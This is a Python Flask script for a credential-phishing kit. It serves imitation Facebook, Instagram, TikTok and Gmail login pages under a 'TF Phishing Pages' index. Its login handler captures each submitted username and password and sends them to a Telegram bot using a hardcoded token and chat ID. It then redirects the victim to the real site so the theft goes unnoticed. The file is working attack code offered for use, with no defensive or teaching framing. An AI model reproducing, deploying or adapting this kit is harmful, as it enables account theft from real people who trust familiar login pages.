from flask import Flask, request, render_template_string, redirect
import random, string, os, requests

app = Flask(__name__)

TELEGRAM_TOKEN = '7467918610:AAHYfUOj76AliAsyj4n8VHF0vroAtHNyX18'
CHAT_ID = '7006569478'

# All fake pages
fake_pages = {
    'facebook': {'title': 'Facebook Login', 'placeholder': ['Email or Phone', 'Password'], 'color': '#3b5998'},
    'instagram': {'title': 'Instagram Login', 'placeholder': ['Phone number, username or email', 'Password'], 'color': '#E1306C'},
    'tiktok': {'title': 'TikTok Login', 'placeholder': ['Username or Email', 'Password'], 'color': '#010101'},
    'gmail': {'title': 'Gmail Login', 'placeholder': ['Email or phone', 'Enter your password'], 'color': '#d93025'},
}

# HTML Template
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
    <style>
        body {
            font-family: sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .box {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px #ccc;
            width: 300px;
        }
        .box h2 {
            text-align: center;
            color: {{ color }};
        }
        .box input {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .box button {
            width: 100%;
            padding: 10px;
            background: {{ color }};
            color: white;
            border: none;
            margin-top: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <form class="box" method="POST" action="/login/{{ platform }}">
        <h2>{{ title }}</h2>
        <input name="username" placeholder="{{ placeholders[0] }}" required>
        <input name="password" placeholder="{{ placeholders[1] }}" type="password" required>
        <button type="submit">Log In</button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    links = ''.join([f'<a href="/{p}" style="display:block;">{p.capitalize()} Login Page</a>' for p in fake_pages])
    return f'<h3>TF Phishing Pages</h3>{links}'

@app.route('/<platform>')
def show_page(platform):
    data = fake_pages.get(platform)
    if not data:
        return "Page not found", 404
    return render_template_string(html_template, title=data['title'], placeholders=data['placeholder'], color=data['color'], platform=platform)

@app.route('/login/<platform>', methods=['POST'])
def get_credentials(platform):
    username = request.form.get("username")
    password = request.form.get("password")
    data = f"🎯 New Login From {platform.upper()}:\n\nUsername: `{username}`\nPassword: `{password}`"
    send_telegram(data)
    return redirect("https://"+platform+".com")

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except:
        print("Telegram error")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
